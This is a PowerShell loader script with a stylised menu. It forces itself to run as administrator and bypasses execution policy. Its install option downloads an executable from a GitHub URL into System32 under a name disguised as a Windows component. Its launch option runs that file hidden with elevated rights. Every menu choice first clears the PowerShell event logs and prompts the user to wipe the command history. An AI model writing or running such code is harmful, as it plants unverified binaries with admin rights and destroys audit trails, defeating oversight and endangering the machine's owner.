# --- FORCE RUN AS ADMINISTRATOR ---
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- CLEAR LOGS & HISTORY FUNCTION ---
function Clear-LogsAndHistory {
    $history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    try {
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational")
    } catch {}

    if (Test-Path $history) {
        Write-Host " [*] Opening history log. Please save and close it to proceed..." -ForegroundColor Yellow
        (Start-Process notepad.exe -ArgumentList $history -PassThru).WaitForExit()
    }
}

# --- SAFE CONSOLE RESIZER (ระบบปรับขนาดแบบปลอดภัย ไม่เด้งดับ) ---
try {
    $raw = $Host.UI.RawUI
    $newWidth = 54
    $newHeight = 15

    # เคลียร์ขนาด buffer และ window แบบเป็นลำดับเพื่อป้องกันข้อจำกัดของ conhost
    $raw.BufferSize = New-Object System.Management.Automation.Host.Size($newWidth, 99)
    $raw.WindowSize = New-Object System.Management.Automation.Host.Size($newWidth, $newHeight)
    $raw.BufferSize = New-Object System.Management.Automation.Host.Size($newWidth, $newHeight)
} catch {
    try {
        [Console]::WindowWidth = 54
        [Console]::WindowHeight = 15
    } catch {}
}

# --- CONFIGURATION ---
$url = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/Pro.exe"
$path = "C:\Windows\System32\BdeUISvsc.exe"
$history = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"


# --- UI FUNCTIONS ---
function Show-Spin ($msg) {
    $sp = @('/', '-', '\', '|')
    for ($i=0; $i -lt 8; $i++) {
        Clear-Host; Show-Head
        Write-Host "  [$($sp[$i%4])] $msg..." -ForegroundColor Magenta
        Start-Sleep -Milliseconds 100
    }
}

function Show-Head {
    $st = if (Test-Path $path) { "[ READY ]" } else { "[ NOT INSTALLED ]" }
    $cl = if (Test-Path $path) { "Green" } else { "DarkGray" }

Write-Host "                                                  " -ForegroundColor Cyan
Write-Host "                                                  " -ForegroundColor Cyan
Write-Host "██  ██ ███  ██ ██████ ▄████▄ █████▄  ▄█████ ██████ " -ForegroundColor Cyan
Write-Host "██  ██ ██ ▀▄██ ██▄▄   ██  ██ ██▄▄██▄ ██     ██▄▄   " -ForegroundColor Cyan
Write-Host "▀████▀ ██   ██ ██     ▀████▀ ██   ██ ▀█████ ██▄▄▄▄ " -ForegroundColor Cyan
Write-Host "                                                  " -ForegroundColor Cyan

    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
    Write-Host " STATUS: " -NoNewline -ForegroundColor White; Write-Host $st -ForegroundColor $cl
    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
}

function Show-Menu {
    Clear-Host; Show-Head
    $isIns = Test-Path $path

    Write-Host "  [1] INSTALL   » Setup Core" -ForegroundColor White
    Write-Host "  [2] UNINSTALL » Clean System" -ForegroundColor White

    if ($isIns) {
        Write-Host "  [3] LAUNCH    » Run as Admin & Exit" -ForegroundColor Green
        Write-Host "  [4] EXIT      » Close Tool" -ForegroundColor Red
    } else {
        Write-Host "  [3] EXIT      » Close Tool" -ForegroundColor Red
    }

    Write-Host "+---------------------------------------------------+" -ForegroundColor DarkCyan
    Write-Host "  CHOICE: " -NoNewline -ForegroundColor White

    $ch = Read-Host
    if (-not $isIns -and $ch -eq "3") { $ch = "4" }

    if ($ch -in @("1", "2", "3", "4")) {
        Clear-LogsAndHistory
    }

    switch ($ch) {
        "1" { Show-Spin "Installing"; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest $url -OutFile $path -ErrorAction Stop; Clear-Host; Show-Head; Write-Host "`n  [+] SUCCESS!" -ForegroundColor Green } catch { Write-Host "`n  [-] FAILED" -ForegroundColor Red }; [Console]::ReadKey($true) | Out-Null; Show-Menu }
        "2" { Show-Spin "Cleaning"; Stop-Process -Name "BdeUISvsc.exe" -Force -ErrorAction SilentlyContinue; if (Test-Path $path) { try { takeown /f $path /a | Out-Null; icacls $path /grant *S-1-5-32-544:F /c | Out-Null; Remove-Item $path -Force -ErrorAction Stop; Write-Host "`n  [+] SYSTEM CLEANED" -ForegroundColor Green } catch { Write-Host "`n  [-] ACCESS DENIED" -ForegroundColor Red } } else { Write-Host "`n  [!] ALREADY CLEAN" -ForegroundColor Cyan }; [Console]::ReadKey($true) | Out-Null; Show-Menu }
        "3" { Show-Spin "Launching"; try { Start-Process $path -WindowStyle Hidden -Verb RunAs; Clear-Host; Show-Head; Write-Host "`n  [+] RUNNING WITH ADMIN PRIVILEGES" -ForegroundColor Green; Start-Sleep -Seconds 2; exit } catch { Write-Host "`n  [-] ERROR RUNNING FILE" -ForegroundColor Red; [Console]::ReadKey($true) | Out-Null; Show-Menu } }
        "4" { exit }
        default { Show-Menu }
    }
}

# --- START RUN SYSTEM ---
Show-Menu

PS C:\Windows\system32>
